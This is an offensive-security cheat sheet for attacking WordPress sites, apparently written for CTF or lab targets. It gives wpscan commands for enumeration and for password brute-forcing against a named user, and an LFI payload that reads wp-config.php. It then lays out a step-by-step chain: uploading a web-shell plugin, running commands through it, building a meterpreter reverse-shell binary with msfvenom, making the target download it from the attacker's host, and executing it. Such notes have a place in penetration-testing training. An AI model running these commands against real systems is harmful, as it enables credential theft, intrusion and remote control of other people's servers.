# Wordpress

## Basic Enumeration

```bash
wpscan --url http://10.10.128.151
```

## Super Scan

It will try to enumerate many things and it might take long.

```bash
wpscan --url http://10.10.128.151/ --enumerate ap,at,cb,dbe,u
```

| **Argument** | **Description** |
| --- | --- |
| -ap | All Plugins |
| -p | Plugins |
| -vp | Vulnerable Plugins |
| -u | Users |
| -vt | Vulnerable Themes |
| -at | All themes |
| -cb | Config Backup |
| --plugins-detection mixed | Plugin detection mode. |
| --plugins-detection passive | Plugin detection mode. |
| --plugins-detection aggresive | Plugin detection mode. Bruteforce |

## Enumerate users

```bash
wpscan --url http://10.10.128.151/ -e u
```

## Bruteforce login with a user and a password list

```bash
wpscan --url http://10.10.128.151 --passwords fsocity.dic -U elliot
```

## Found LFI ?

Try to read Wordpress config file:

```bash
http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```
More paths to test [here](https://github.com/D35m0nd142/LFISuite/blob/master/pathtotest.txt).

## Install Malicious Plugin - WebShell

```bash
# Wordpress Web Shell - Install as Plugin
/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php

## Pack the plugin
$ sudo zip plugin-shell plugin-shell.php

## Upload the shell
Add Plugins
Upload Plugin
Browse
Select the zip file
Install Now

## Run Commands
$ curl http://10.10.10.110/wp-content/plugins/plugin-shell.php?cmd=whoami

## Get a reverse shell
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=443 -f elf > shell.elf
$ sudo python3 -m http.server 80
$ curl http://10.10.10.110/wp-content/plugins/plugin-shell.php?cmd=wget%20http://192.168.100.10/shell.elf

## Start a listener
$ use exploit/multi/handler
$ set PAYLOAD linux/x86/meterpreter/reverse_tcp (same as the MSFVENOM)
$ set LPORT 443
$ set LHOST tun0
$ run

## Make it executable (chmod +x shell.elf)
$ curl http://10.10.10.110/wp-content/plugins/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf

## Trigger the exploit
$ curl http://10.10.10.110/wp-content/plugins/plugin-shell.php?cmd=./shell.elf
```